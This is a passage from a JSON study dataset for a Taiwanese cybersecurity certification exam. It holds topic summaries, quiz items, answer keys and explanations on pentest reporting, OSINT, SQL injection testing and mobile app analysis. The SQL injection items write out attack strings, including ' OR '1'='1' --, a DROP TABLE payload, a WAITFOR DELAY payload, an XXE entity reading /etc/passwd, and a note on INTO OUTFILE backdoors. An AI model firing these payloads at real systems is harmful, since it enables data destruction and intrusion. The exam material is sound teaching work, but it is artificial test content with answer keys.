    "第三方報告可信度：零弱點、只有版本與雜湊 → 要求檢測歷程報告（工具、規則、範圍、時間、紀錄）。",
    "收到重大弱點通報（內部封閉測試期）→ 先聯繫測試者了解細節與重現，再依風險決定隔離、修補、通報；不要先全公司廣播、也不要立刻關閉或通報主管機關。",
    "報告中的資訊（如 HTTP 未加密）要能對應到具體風險：圖中以 http:// 傳輸，代表未強制使用 HTTPS。",
    "滲透測試報告分級常用嚴重等級，不使用『緊急／急迫』這類語意；報告也不能為了好讀而省略技術細節。"
   ],
   "trap": "以為報告越『符合期望』越好、把沒有弱點的報告直接當證明，或把測試過程耗時當成報告重點。",
   "quiz": [
    {
     "stem": "情境如附圖所示。你在整理將完整的測試報告準備提交給董事會，下列何項內容最「不」重要？",
     "options": [
      "測試人員背景與工具版本",
      "執行測試所需耗費的時間",
      "符合公司期望及需求的結論",
      "弱點評估結果、評估計分的方法論、分數與修補建議"
     ],
     "answer": 1,
     "context": "你受聘為「超好用科技股份有限公司」的資安顧問，協助執行其年度資訊安全強化計畫。該公司目前正導入 DevSecOps 實踐，並預定完成以下三項目標：\n1. 對旗下新開發的 ERP-Web 系統執行全面「原始碼檢測」與「滲透測試」；\n2. 執行一次針對雲端主機與內部網段的「資安健診」作業；\n3. 建立跨部門的風險評估與弱點修補作業流程，以提升資安治理成熟度。\n\n在測試與健診過程中，團隊發現若干高風險弱點與不當配置，例如：缺乏原始碼檢測、程式碼包含敏感資訊、驗證缺陷等。你需依據檢測結果，提出分析報告、優先順序、工具選用建議，以及內部控制對策，並向董事會報告成果。",
     "hint": "董事會要能做決策：需要看到什麼來判斷風險與投入？哪一項最不影響決策。",
     "explanation": "答案 B（最不重要）。提交給董事會的完整報告重在：A 測試人員背景與工具版本（可信度與可重現性）、C 結論（但仍需如實反映）、D 弱點評估結果、評分方法論、分數與修補建議（決策核心）。B 執行測試所需耗費的時間屬於流程資訊，對決策的重要性最低。",
     "source": "114-2 第39題"
    },
    {
     "stem": "情境如附圖所示。第三方套件供應商提交了一份源碼檢測報告，報告內容僅顯示受測軟體的版本、程式碼的行數、受測主件檔案的雜湊值，你發現報告中完全查無任何弱點，連資訊等級的弱點都沒有，你該如何向甲方證明所採用的套件在當下是安全無虞？",
     "options": [
      "請第三方套件供應商再提供一份其它檢測報告",
      "請第三方套件供應商提交一份源碼檢測的歷程報告",
      "直接交付第三方套件供應商提交的源碼檢測報告給甲方",
      "自己針對第三方套件進行黑箱檢測並撰寫報告提交於甲方"
     ],
     "answer": 1,
     "context": "你是一間跨國企業的資安管理人員，你每一年都必須針對集團、子集團進行安全檢測與合規要求的驗證，在台灣由於集團參與了我國 A 級機關的軟體開發案，你必須針對組織的流程及服務進行合規的證明，你目前必須完成的包含有核心系統的滲透測試、採購的第三方套件商提供的源碼檢測報告及協助集團提交主要服務的系統開發流程的相關資安證明。",
     "hint": "逐項問：這份文件或做法能不能證明套件經過完整、可信的檢測？",
     "explanation": "答案 B。報告只有版本、行數與雜湊值，卻完全沒有任何弱點（連資訊等級都沒有），無法證明檢測是否真的做過、範圍與規則為何。要證明套件安全無虞，應請廠商提交檢測歷程報告（工具、規則、範圍、紀錄）以佐證。A 再提供另一份報告，內容也可能同樣缺乏證據；C 直接交付報告，等於未驗證；D 自己針對第三方套件做黑箱檢測，並不是向甲方證明該廠商報告可信的適當方式。",
     "source": "113-2 第37題"
    },
    {
     "stem": "情境如附圖所示。當滲透測試者通報可以遠端執行指令的弱點時，尚在內部封閉測試期間，您應該首先採取的行動是下列何項？",
     "options": [
      "關閉受影響的 web 應用程式",
      "馬上通知公司的所有員工",
      "聯繫滲透測試者進行進一步的詳情討論",
      "通報網路安全當局"
     ],
     "answer": 2,
     "context": "【題組5】\n您是 XYZ 公司的資訊安全負責人，公司正在進行滲透測試。在測試過程中，滲透測試者通報了一些嚴重的 Web 安全弱點，包括可以遠端執行指令的弱點和能夠讀取本地文件的弱點。\n並且成功的利用 auth.log 檔案的本地讀取及透過 SSH 驗證注入網站的應用程式達成遠端執行指令稿，使用測試人員可以透過 GitHub 下載 Reverse Shell 和各種編碼或編譯套件，透過這台主機上，發現了管理人員在 root 目錄下放置了帳號密碼檔，且這組帳號密碼經過測試，有大量的使用者可以用相同密碼登入。",
     "hint": "回想弱點通報後的處理流程，逐項判斷每個動作是否適合作為第一步。",
     "explanation": "答案 C。重大弱點（可遠端執行指令）在內部封閉測試期間被通報，首要行動是聯繫滲透測試者進一步討論詳情，掌握弱點範圍、重現方式與影響，才能決定後續處置。A 立即關閉受影響應用，可能在未釐清前造成不必要中斷；B 立刻通知全體員工，會引發恐慌且無助於處理；D 此時尚在內部測試，貿然通報網路安全當局並非首要。",
     "source": "112-2 第37題"
    },
    {
     "stem": "題組背景描述如附圖。承上題，當小李完成滲透測試後於報告中發現附圖資訊，判斷公司可能出現下列何種風險漏洞？",
     "options": [
      "敏感目錄暴露（Possible sensitive directories）",
      "未強制使用 HTTPS（Unencrypted connection）",
      "Session Cookie 未設定為Secure安全模式（Cookie without Secure flag set）",
      "啟用SSH 較弱MAC 加密算法（SSH Weak MAC Algorithms Enabled）"
     ],
     "answer": 1,
     "context": "（題組 4）\n滲透測試（Penetration Test）是通過模擬惡意黑客的攻擊方法，來評估計算機網路系統安全的一種測試，目的是發掘系統漏洞，並提出改善方法，且通常來說是善意的，小李身為 A 公司的資安工程師，請就上述情境回答下列問題。\n\n（附圖）\nGET http://172.16.112.216:8080/\n狀態 200\n版本 HTTP/1.1\n已傳輸 2.17 KB（大小 10.97 KB）\n回應檔頭 (168 B)\nContent-Encoding: gzip\nContent-Type: text/html;charset=UTF-8\nDate: Wed, 16 Sep 2020 03:23:08 GMT\nTransfer-Encoding: chunked\nVary: Accept-Encoding",
     "hint": "只看附圖有什麼：網址的前綴、回應標頭裡有沒有 Cookie 或目錄與加密演算法資訊，再回頭對照報告項目。",
     "explanation": "答案 B。附圖中的請求網址為 http://172.16.112.216:8080/，回應資訊以 HTTP/1.1 明文傳輸，並未使用 HTTPS，對應到報告項目『未強制使用 HTTPS（Unencrypted connection）』。A 圖中沒有目錄資訊；C 圖中沒有 Cookie 與 Secure 旗標；D 圖中沒有 SSH 與 MAC 演算法資訊。",
     "source": "110-1 第34題"
    },
    {
     "stem": "題組背景描述如附圖。檢測團隊X最終依照計畫如期完成公司測試案，並交付測試報告，關於滲透測試報告，下列敘述何者正確？",
     "options": [
      "滲透測試報告主要目的為提升組織合規性與其適法性，並能有效促進商業行為發展",
      "滲透測試報告弱點分級通常使用緊急（Emergency）、急迫（Urgent）、一般（Standard）、普通（Normal）",
      "為提升滲透測試可讀性，對於安全弱點技術細節應考量精簡或忽略，並詳述問題改善與修復方案",
      "滲透測試報告使高階管理人員更易於決策安全措施之執行，也協助資安單位順利修復弱點與實踐安全控制"
     ],
     "answer": 3,
     "context": "題組：某公司為了符合國際標準要求，將年度定期舉行之滲透測試（Penetration Test, PT）作業，委由外部資安檢測團隊 X 來進行。\n\n根據上列資訊，請回答下列問題：",
     "hint": "回想滲透測試報告的目的與讀者，逐項判斷每句描述是否正確。",
     "explanation": "答案 D。滲透測試報告使高階管理人員更易於決策，也協助資安單位順利修復弱點與實踐安全控制。A 報告主要目的是揭露與改善風險，而非促進商業行為；B 弱點分級通常使用嚴重度等級，不是緊急／急迫／一般／普通；C 報告不應精簡或忽略技術細節，修補需要這些資訊。",
     "source": "109-1 第40題"
    }
   ]
  },
  {
   "id": "2.2-08",
   "section": "2.2",
   "title": "滲透前偵察與 OSINT",
   "examHits": 4,
   "examRefs": [
    "112-1 第37題",
    "112-1 第38題",
    "112-1 第39題",
    "110-1 第20題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "滲透測試的第一步是被動情報收集與足跡建立（Footprint）：不直接打目標，而是用公開資源蒐集資訊。常用資源：Shodan（連網設備搜尋引擎）、Censys（全球網際網路掃描資料，含主機與憑證）、ZoomEye（中國創宇 404 實驗室的網路空間搜尋引擎）、FOFA（中國創立的網路空間資產搜尋引擎）、Pulsedive（威脅情報）、Intelligence X（intelx.io，含暗網與加密貨幣搜尋）；子網域列舉工具有 subfinder、SubDomainizer、SubBrute 等，VirusTotal 是檔案與網址檢測平台，不是子網域查找工具。搜尋引擎進階語法（Google Hacking Database）例如 site:tw 限定台灣網站、intitle:index.of 找目錄索引頁；Bing 也有類似的進階運算子。",
   "keyPoints": [
    "Shodan／Censys／ZoomEye／FOFA 都是網路空間搜尋引擎：FOFA 是中國創立（不是『非中國』）；ZoomEye 出自中國創宇 404 實驗室；Censys 蒐集網際網路掃描資料。",
    "子網域列舉工具：subfinder、SubDomainizer、SubBrute；VirusTotal 是檔案／網址威脅檢測平台，不是子網域工具。",
    "Google Hacking：site:tw＝限定台灣網站、intitle:index.of＝找目錄索引頁；Bing 也有類似進階語法。",
    "Censys 不是『無線網路刺探資料庫』；intelx.io 能搜尋暗網與加密貨幣資訊；Pulsedive 蒐集威脅情報。",
    "情報收集屬滲透測試早期階段（前期溝通後的第一個技術階段），目標是不驚動目標地取得資產資訊。"
   ],
   "trap": "把 Censys 說成無線網路刺探資料庫、把 FOFA 說成非中國資料庫、把 VirusTotal 當子網域工具，或以為只有 Google 有進階搜尋語法。",
   "quiz": [
    {
     "stem": "關於網路資源的敘述，下列何者錯誤？",
     "options": [
      "FOFA 是覆蓋全球資料頗為完整的 IT 設備搜尋引擎，非中國創立資料庫",
      "Shodan 是世界上第一個用於聯網與 IoT 設備的搜尋引擎，可以查找到電子門鎖相關資訊",
      "ZoomEye 是由中國創宇 404 實驗室所搭建網路空間搜尋引擎",
      "Censys 也是蒐集全球最新的 Internet 掃描數據源"
     ],
     "answer": 0,
     "context": "【題組 5】\n網站滲透攻擊是紅隊滲透重要基本課題，而善用網路資源與工具，可以達到事半功倍之效果，身為資安滲透團隊成員，以下相關網路資源與工具，事必須要掌握的技術與技巧。",
     "hint": "逐項回想每個網路空間搜尋引擎的背景與用途，判斷描述是否正確。",
     "explanation": "答案 A（錯誤的敘述）。FOFA 是中國創立的網路空間資產搜尋引擎，『非中國創立』是錯的。B Shodan 是用於連網與 IoT 設備的搜尋引擎，可查到電子門鎖等相關資訊；C ZoomEye 為中國創宇 404 實驗室搭建的網路空間搜尋引擎；D Censys 蒐集全球網際網路掃描資料，官方視為正確敘述。",
     "source": "112-1 第37題"
    },
    {
     "stem": "子網域資訊的取得是滲透前重要的 Footprint 程序，下列何項「不」是子網域查找工具？",
     "options": [
      "subfinder",
      "SubDomainizer",
      "Virustotal",
      "SubBrute"
     ],
     "answer": 2,
     "context": "【題組 5】\n網站滲透攻擊是紅隊滲透重要基本課題，而善用網路資源與工具，可以達到事半功倍之效果，身為資安滲透團隊成員，以下相關網路資源與工具，事必須要掌握的技術與技巧。",
     "hint": "逐項回想每個工具的主要用途。",
     "explanation": "答案 C（不是子網域查找工具）。VirusTotal 是檔案與網址的威脅檢測平台，並非專門的子網域查找工具。A subfinder、B SubDomainizer、D SubBrute 都是常見的子網域列舉工具。",
     "source": "112-1 第38題"
    },
    {
     "stem": "身為一個滲透測試人員，必須善用網際網路有用資料庫或搜尋引擎，下列各類資料庫系統的敘述，何者錯誤？",
     "options": [
      "shodan.io 是世界上用於聯網設備查找的搜索引擎",
      "censys.io 是一個免費資料庫，累積許多無線網路重要刺探資訊",
      "pulsedive.com 蒐集許多威脅情報",
      "intelx.io 可處理加密貨幣搜尋與暗網搜尋"
     ],
     "answer": 1,
     "context": "【題組 5】\n網站滲透攻擊是紅隊滲透重要基本課題，而善用網路資源與工具，可以達到事半功倍之效果，身為資安滲透團隊成員，以下相關網路資源與工具，事必須要掌握的技術與技巧。",
     "hint": "逐項回想每個資料庫或搜尋引擎的主要用途，判斷描述是否正確。",
     "explanation": "答案 B（錯誤的敘述）。Censys 蒐集的是全球網際網路的主機、服務與憑證等掃描資料，並不是累積許多無線網路刺探資訊的資料庫。A shodan.io 是用於聯網設備查找的搜尋引擎；C pulsedive.com 蒐集許多威脅情報；D intelx.io 可處理加密貨幣搜尋與暗網搜尋，皆為官方視為正確的敘述。",
     "source": "112-1 第39題"
    },
    {
     "stem": "搜尋引擎的進階搜尋指令常被用來刺探網站重要資訊，更被用在滲透測試上，其中最知名就是 Google Hacking Database（GHDB），關於搜尋引擎進階指令發展、應用與技術分析，下列敘述哪些正確？（複選）",
     "options": [
      "駭客利用 google進階搜尋技巧與運算，搜索網際網路中定位特定的文本字，作為滲透入侵易受攻擊的 Web應用程序",
      "site:tw 此指令是限制搜尋標的為台灣網站",
      "intitle:index.of site:tw 描述是列出該網站 index.of網站目錄清單",
      "在另一個知名搜尋引擎 Bing，並沒有類似的應用"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "context": "（原卷另附網路拓樸圖〔路由器 R1、R2、R3 與交換器、主機 A～H 的 IP 與 VLAN 配置〕，與本題無關）",
     "hint": "回想搜尋引擎進階運算子的語法與作用，逐項判斷每句是否正確。",
     "explanation": "答案 A、B、C。A 駭客利用 Google 進階搜尋技巧與運算定位特定文字，用來找出易受攻擊的 Web 應用；B site:tw 限制搜尋標的為台灣網站；C intitle:index.of site:tw 可列出台灣網站中的目錄索引頁（網站目錄清單）。D 錯誤：Bing 等其他搜尋引擎同樣有類似的進階運算子應用。",
     "source": "110-1 第20題"
    }
   ]
  },
  {
   "id": "2.2-09",
   "section": "2.2",
   "title": "SQL 注入測試手法",
   "examHits": 3,
   "examRefs": [
    "115-1 第29題",
    "115-1 第37題",
    "115-1 第38題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "SQL 注入測試的原則是：先用低風險、可觀察的語法確認有沒有注入點，再判斷風險，不可用會破壞資料的語法對正式環境亂試。常見測試語法：單引號、OR '1'='1' -- 這類恆真條件用來確認注入存在；時間延遲語法（如 WAITFOR DELAY 或 sleep）用於盲注，但會使伺服器延遲、須謹慎使用；DROP TABLE 會刪整張資料表，通常不會在實戰使用；INTO OUTFILE 在特定情境下可寫入檔案（可能取得 RCE）。重點：恆真條件若出現在新增、修改、刪除語句中，會使條件恆為真而波及所有資料，風險很高，並非『萬用、影響低』。盲注（Blind SQLi）是看不到錯誤訊息，要靠行為差異（如時間延遲或回應內容不同）來推斷資料。",
   "keyPoints": [
    "要確認是否存在 SQL 注入 → 用含恆真條件與註解的字串（例 ' OR '1'='1' --）；<script> 是 XSS、%00 這類亂碼是邊界／編碼測試、<entity SYSTEM=…> 是 XXE。",
    "恆真條件 ' OR '1'='1' -- 並非萬用：用在更新或刪除功能會影響所有資料列，風險高，必須先評估語句類型。",
    "盲注（Blind SQLi）：沒有錯誤訊息回顯，改用行為差異（時間延遲、頁面差異）推斷資料；可手動做，也可用工具。",
    "破壞性語法（DROP TABLE）通常不在實戰使用；時間延遲語法會影響效能，須謹慎。",
    "INTO OUTFILE 在特定條件下可寫入檔案，進一步造成遠端程式碼執行，所以 SQL 注入的影響不只洩漏資料。"
   ],
   "trap": "以為 ' OR '1'='1' -- 是無害的萬用語法，可直接用在新增、刪除、修改功能；或把 XSS、XXE 的測試字串當成 SQL 注入測試。",
   "quiz": [
    {
     "stem": "網站應用程式安全測試中，盲注式SQL注入攻擊（Blind SQL Injection）的測試比一般 SQL注入攻擊更具挑戰，以下描述何者最正確？",
     "options": [
      "難以透過錯誤訊息來洩漏資料庫資訊，而透過行為模式（如：時間延遲回應）推斷資料",
      "盲注式 SQL注入只會影響後端資料庫，不會影響應用程式的前端",
      "盲注式 SQL注入需要特定的自動化工具，無法手動執行",
      "若發生在無法存取原始碼的黑箱測試情境中，偵測更加困難"
     ],
     "answer": 0,
     "hint": "回想盲注式 SQL 注入的定義與測試方式，逐項判斷每句是否正確。",
     "explanation": "答案 A。盲注式 SQL 注入不會回顯錯誤訊息，需要透過行為模式（如時間延遲回應、頁面差異）來推斷資料，因此比一般 SQL 注入更具挑戰。B 盲注同樣會影響前端應用行為與資料外洩，不是只影響後端資料庫；C 盲注可以手動執行，不一定需要自動化工具；D 談的是黑箱情境下的偵測難度，官方仍採 A，官方未說明為何 D 不選。",
     "source": "115-1 第29題"
    },
    {
     "stem": "情境如附圖所示。若欲確認 SQL 注入是否存在，下列何者為最適合的測試語法？",
     "options": [
      "<script>alert(1)</script>",
      "OR '1'='1' --",
      "%00%ff%fe%fd",
      "<entity SYSTEM=\"file:///etc/passwd\">"
     ],
     "answer": 1,
     "context": "某銀行委託資安團隊對新版線上金融交易系統執行資安檢測，包含滲透測試、原始碼檢測及整體資安健診。在滲透測試過程中，資安團隊成功繞過前端 WAF，發現系統可透過交易金額欄位進行 SQL 注入（SQL Injection）。在原始碼檢測時，資安團隊發現開發人員未使用參數化查詢（Parameterized Query），而直接拼接字串。",
     "hint": "逐項回想每個字串是測試哪一種漏洞用的。",
     "explanation": "答案 B。確認 SQL 注入是否存在，適合使用含恆真條件與註解的字串，如 OR '1'='1' --，觀察應用行為是否改變。A <script>alert(1)</script> 是 XSS 測試語法；C %00%ff%fe%fd 是特殊位元組／編碼邊界測試；D <entity SYSTEM=\"file:///etc/passwd\"> 是 XXE（XML 外部實體）測試語法。",
     "source": "115-1 第37題"
    },
    {
     "stem": "情境如附圖所示。針對 SQL注入測試，下列哪一個觀念最「不」適切？",
     "options": [
      "' OR '1'='1' -- 是非常萬用的語法，通常可以有效測出 SQL Injection存在與否，對測試標的影響程度低，無論是在資料庫的新增、刪除、修改都可以直接使用",
      "'; DROP TABLE Products;# 這種語法會導致刪除整張資料表，通常不會在實戰過程中使用這種語法",
      "'; IF (1=1) WAITFOR DELAY '0:0:10'-- 這種語法會導致伺服器延遲 10 秒再回應，有可能會讓使用者感受到效能異常，必須謹慎使用",
      "在特定情境下，施測人員可以透過 INTO OUTFILE 這種功能寫入後門到資料庫伺服器中，並且透過該後門達成 Remote Code Execution"
     ],
     "answer": 0,
     "context": "某銀行委託資安團隊對新版線上金融交易系統執行資安檢測，包含滲透測試、原始碼檢測及整體資安健診。在滲透測試過程中，資安團隊成功繞過前端 WAF，發現系統可透過交易金額欄位進行 SQL 注入（SQL Injection）。在原始碼檢測時，資安團隊發現開發人員未使用參數化查詢（Parameterized Query），而直接拼接字串。",
     "hint": "逐項判斷每個 SQL 注入測試觀念是否正確。",
     "explanation": "答案 A（最不適切）。' OR '1'='1' -- 是常見測試語法，但並非萬用，也不是影響程度低：若用在新增、刪除、修改的語句，會使條件恆為真，可能一次修改或刪除所有資料，風險很高，所以不可在這類功能直接使用。B DROP TABLE 會刪除資料表，實戰通常不用；C WAITFOR DELAY 會造成伺服器延遲 10 秒，需謹慎；D INTO OUTFILE 在特定條件下可寫入後門並達成遠端程式碼執行，皆為適切的觀念。",
     "source": "115-1 第38題"
    }
   ]
  },
  {
   "id": "2.2-10",
   "section": "2.2",
   "title": "行動 App 安全檢測",
   "examHits": 3,
   "examRefs": [
    "115-2 第31題",
    "115-1 第30題",
    "114-2 第23題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "行動 App 安全檢測分為靜態分析（反組譯、逆向工程）與動態分析（App 執行時觀察與操作）。動態分析時若要做程式碼注入與函式掛鉤（Function Hooking，如用 Frida 攔截函式），通常需要 Root 權限（或可修改的環境），因為一般 App 沙箱無權介入其他程序。開發者會用混淆（Obfuscation）轉換程式碼與資料，提高理解與反組譯的困難度，但無法讓程式完全不能被逆向，也不是為了加速或縮小檔案。金鑰保存方面，Android 在專用硬體提供可信執行環境（TEE）等機制來產生與保護加密金鑰，不應把金鑰放在 Shared Preferences、內部儲存或外部儲存這類一般儲存空間。",
   "keyPoints": [
    "Android 動態分析要做程式碼注入與函式掛鉤 → 通常需要 Root 權限；只有 App 沙箱或一般使用者權限不夠。",
    "混淆的作用 → 提高閱讀與反組譯難度，延緩分析，不等於『完全無法逆向』，也不是效能或縮檔手段。",
    "保護加密金鑰 → 使用 Android Keystore 背後的專用硬體機制（TEE）；Shared Preferences、內部儲存、外部儲存都是一般檔案儲存，不是金鑰保護機制。",
    "行動 App 檢測兩條線：靜態（解包、反編譯、檢視程式碼與設定）與動態（執行時攔截、修改、觀察流量）。",
    "檢測環境要用測試機或模擬器，取得 Root 是為了檢測，不代表正式環境能放寬。"
   ],
   "trap": "把混淆誤認為加密或防逆向的完全解法；以為 Shared Preferences 或內部儲存適合保存金鑰；或以為一般使用者權限就能做函式掛鉤。",
   "quiz": [
    {
     "stem": "於作業系統為 Android 之行動裝置上進行動態分析時，若要執行程式碼注入（Code Injection）和函式掛鉤（Function Hooking）等技術，通常需要取得下列何種權限？",
     "options": [
      "App Sandbox Privileges Only",
      "Root Access",
      "Standard User Privileges",
      "Cloud Administrator Privileges"
     ],
     "answer": 1,
     "hint": "回想 Android 權限模型與動態分析技術的需求，逐項判斷哪種權限足以執行注入與掛鉤。",
     "explanation": "答案 B。在 Android 上要執行程式碼注入與函式掛鉤，需要介入其他程序的執行環境，通常必須取得 Root 權限。A 只有 App 沙箱的權限無法影響其他程序；C 一般使用者權限同樣受沙箱限制；D 雲端管理者權限是雲端服務管理層面，與裝置上的程序注入無關。",
     "source": "115-2 第31題"
    },
    {
     "stem": "對手機應用程式透過逆向工程（Reverse Engineering）執行安全檢測時，常可觀察到存在混淆（Obfuscation）等技巧，關於該機制之描述，下列何者最正確？",
     "options": [
      "使手機應用程式完全無法被逆向工程",
      "透過轉換程式碼和資料，提高理解和反組譯的困難度",
      "加速手機應用程式的執行速度",
      "減少手機應用程式的檔案大小"
     ],
     "answer": 1,
     "hint": "回想程式碼混淆的目的與效果，逐項判斷每句是否正確。",
     "explanation": "答案 B。混淆是轉換程式碼與資料的結構、名稱與流程，提高理解與反組譯的困難度，但並非無法逆向。A 說使 App『完全無法』被逆向，過度絕對；C 混淆不會加快執行速度；D 混淆也不是為了縮減檔案大小，甚至可能增加。",
     "source": "115-1 第30題"
    },
    {
     "stem": "Android 作業系統為提昇安全性，在專用硬體元件中提供下列何項生成/保護加密金鑰的機制？",
     "options": [
      "共用偏好設定（Shared Preferences）",
      "內部儲存（Internal Storage）",
      "可信執行環境（Trusted Execution Environment, TEE）",
      "外部儲存（External Storage）"
     ],
     "answer": 2,
     "hint": "逐項回想每個選項是什麼，判斷哪一個是專用硬體元件中用來保護金鑰的機制。",
     "explanation": "答案 C。Android 提供可信執行環境（TEE）等硬體隔離機制來生成與保護加密金鑰，金鑰不會以明文暴露給一般應用程式空間。A Shared Preferences 是以檔案形式保存設定資料；B 內部儲存、D 外部儲存都是一般檔案儲存，並非硬體保護金鑰的機制。",
     "source": "114-2 第23題"
    }
   ]
  }
 ],
 "links": [
  {
   "a": "1.1-01",
   "b": "2.1-06",
   "why": "端點調查看到的行為，要對回 ATT&CK 戰術技術"
  },
  {
   "a": "1.1-01",
   "b": "1.1-09",
   "why": "APT 攻擊鏈各階段，可逐一對應 ATT&CK 戰術"
  },
  {
   "a": "1.1-01",
   "b": "1.2-19",
   "why": "ATT&CK 是威脅情資分享時共通的描述語言"
  },
  {
   "a": "1.1-02",
   "b": "1.1-05",
   "why": "差別在：越權是缺授權檢查，CSRF／XSS 是濫用信任"
  },
  {
   "a": "1.1-02",
   "b": "2.2-04",
   "why": "執行期的越權缺陷靠 DAST 或人工測試找"
  },
  {
   "a": "1.1-03",
   "b": "1.1-04",
   "why": "後門是留門，Windows 持久化是讓它開機仍在"
  },
  {
   "a": "1.1-03",
   "b": "1.2-03",
   "why": "發現反彈 shell 先隔離並擷取記憶體，別關機"
  },
  {
   "a": "1.1-03",
   "b": "1.2-10",
   "why": "反彈 shell 的對外連線，靠 IPS 與出口過濾阻斷"
  },
  {
   "a": "1.1-04",
   "b": "2.1-06",
   "why": "排程、LOLBin 的痕跡靠程序樹與父子關係調查"
  },
  {
   "a": "1.1-04",
   "b": "1.2-15",
   "why": "系統強化與基線，縮小 Windows 可被濫用的面"
  },
  {
   "a": "1.1-05",
   "b": "1.2-16",
   "why": "CSRF 防護靠 token 與 SameSite，和注入的防法（參數化查詢）不同"
  },
  {
   "a": "1.1-05",
   "b": "1.2-07",
   "why": "XSS 根治靠輸出編碼與 CSP"
  },
  {
   "a": "1.1-05",
   "b": "1.1-06",
   "why": "差別在：XSS 攻擊使用者瀏覽器，注入攻擊伺服端"
  },
  {
   "a": "1.1-06",
   "b": "1.2-07",
   "why": "注入的根治是參數化查詢，過濾字元不夠"
  },
  {
   "a": "1.1-06",
   "b": "2.2-09",
   "why": "SQL 注入測試先用低風險語法確認，再往下"
  },
  {
   "a": "1.1-06",
   "b": "2.2-06",
   "why": "源碼檢測看字串拼接 SQL 就知注入風險"
  },
  {
   "a": "1.1-06",
   "b": "1.2-14",
   "why": "WAF 虛擬修補可暫擋已知注入特徵"
  },
  {
   "a": "1.1-07",
   "b": "1.1-12",
   "why": "取得 Hash 後可離線破解或 Pass the Hash"
  },
  {
   "a": "1.1-07",
   "b": "1.2-17",
   "why": "微分段限制憑證被盜後的橫向移動"
  },
  {
   "a": "1.1-07",
   "b": "1.2-09",
   "why": "憑證被竊後，抗釣魚 MFA 讓盜用難度升高"
  },
  {
   "a": "1.1-08",
   "b": "1.2-14",
   "why": "Log4Shell 來不及修補時，用 WAF 虛擬修補擋"
  },
  {
   "a": "1.1-08",
   "b": "2.1-04",
   "why": "Log4j 的 CVE 編號與 CVSS 用來排修補優先序"
  },
  {
   "a": "1.1-09",
   "b": "1.2-26",
   "why": "蜜罐可偵測 APT 在內網的探索與橫向移動"
  },
  {
   "a": "1.1-09",
   "b": "1.1-03",
   "why": "APT 常建多條 C2 與後門，避免被一刀切斷"
  },
  {
   "a": "1.1-10",
   "b": "2.1-07",
   "why": "釣魚信件怎麼鑑識，看標頭與連結真實去向"
  },
  {
   "a": "1.1-10",
   "b": "1.2-09",
   "why": "抗釣魚 MFA（FIDO2）才擋得住 AitM 釣魚"
  },
  {
   "a": "1.1-10",
   "b": "1.1-12",
   "why": "釣魚騙來的帳密常被拿去做密碼攻擊"
  },
  {
   "a": "1.1-11",
   "b": "1.1-14",
   "why": "Slowloris（應用層）與 Ping Flood（網路層）都能從遠端發動 DoS"
  },
  {
   "a": "1.1-11",
   "b": "1.2-11",
   "why": "網路層攻擊面，靠網段切割與 VLAN 設計縮小"
  },
  {
   "a": "1.1-11",
   "b": "2.1-08",
   "why": "網路攻擊的證據靠封包分析還原"
  },
  {
   "a": "1.1-12",
   "b": "1.2-09",
   "why": "密碼噴灑與撞庫的解法是 MFA 與異常偵測"
  },
  {
   "a": "1.1-12",
   "b": "2.1-01",
   "why": "差別在：噴灑是同密碼試多帳號，日誌看來源與帳號分布"
  },
  {
   "a": "1.1-13",
   "b": "2.1-02",
   "why": "弱點掃描就是在找各類弱點，再排修補優先序"
  },
  {
   "a": "1.1-13",
   "b": "2.1-04",
   "why": "弱點用 CWE 分類，個案用 CVE 編號，CVSS 評分"
  },
  {
   "a": "1.1-13",
   "b": "1.2-15",
   "why": "組態錯誤與多餘服務屬弱點，用基線強化消除"
  },
  {
   "a": "1.1-14",
   "b": "1.2-23",
   "why": "DDoS 判讀出層級後，才對應 CDN、清洗等防護"
  },
  {
   "a": "1.1-14",
   "b": "2.1-08",
   "why": "DDoS 的 SYN 洪水特徵由封包側錄看出"
  },
  {
   "a": "1.1-15",
   "b": "1.2-22",
   "why": "AI 攻擊判讀後，應變與防護照 AI 專屬流程"
  },
  {
   "a": "1.1-15",
   "b": "1.2-27",
   "why": "AI 平台資料外洩的防線之一是 DLP"
  },
  {
   "a": "1.1-16",
   "b": "1.2-06",
   "why": "OT 攻擊判讀完，補償控制與分段是對應防護"
  },
  {
   "a": "1.1-16",
   "b": "1.2-17",
   "why": "OT 與 IT 之間分段，防 SMB 掃描橫向擴散"
  },
  {
   "a": "1.1-17",
   "b": "1.2-20",
   "why": "供應鏈攻擊的防線是供應商風險管理"
  },
  {
   "a": "1.1-17",
   "b": "1.2-25",
   "why": "容器映像與 Registry 被污染，靠雲端容器防護"
  },
  {
   "a": "1.1-17",
   "b": "1.2-01",
   "why": "供應鏈事件要找根因後多層補強，不是只買一樣"
  },
  {
   "a": "1.1-17",
   "b": "2.2-04",
   "why": "SCA 能盤點第三方元件，提早發現供應鏈風險"
  },
  {
   "a": "1.2-01",
   "b": "1.2-20",
   "why": "事件根因若在第三方元件，補洞要含供應商管理"
  },
  {
   "a": "1.2-02",
   "b": "1.2-13",
   "why": "勒索復原靠離線備份，要符合 RTO／RPO"
  },
  {
   "a": "1.2-02",
   "b": "2.1-09",
   "why": "還原備份時要驗證完整性，並保留證據"
  },
  {
   "a": "1.2-03",
   "b": "1.2-12",
   "why": "差別在：首要應變是止血保全，800-61 是四階段全流程"
  },
  {
   "a": "1.2-03",
   "b": "2.1-09",
   "why": "隔離時擷取記憶體與磁碟映像，供數位鑑識"
  },
  {
   "a": "1.2-03",
   "b": "1.2-13",
   "why": "勒索發生先隔離網段，再談復原"
  },
  {
   "a": "1.2-04",
   "b": "2.1-07",
   "why": "憑證與數位簽章可驗證信件與網站的真偽"
  },
  {
   "a": "1.2-04",
   "b": "1.2-27",
   "why": "差別在：加密保護資料本身，DLP 管資料往哪流出"
  },
  {
   "a": "1.2-05",
   "b": "1.2-12",
   "why": "CSF 的 Respond／Recover 對應 800-61 的處理流程"
  },
  {
   "a": "1.2-05",
   "b": "1.2-08",
   "why": "CSF 2.0 新增 Govern，與資安法治理要求呼應"
  },
  {
   "a": "1.2-06",
   "b": "1.2-18",
   "why": "OT 補償控制要含廠商遠端維護的跳板管控"
  },
  {
   "a": "1.2-06",
   "b": "1.2-17",
   "why": "差別在：OT 分段依 Purdue 與 62443，零信任是動態授權"
  },
  {
   "a": "1.2-07",
   "b": "1.2-16",
   "why": "差別在：注入與 XSS 靠輸出與參數化，上傳、XXE、CSRF 靠專屬手法"
  },
  {
   "a": "1.2-07",
   "b": "1.2-21",
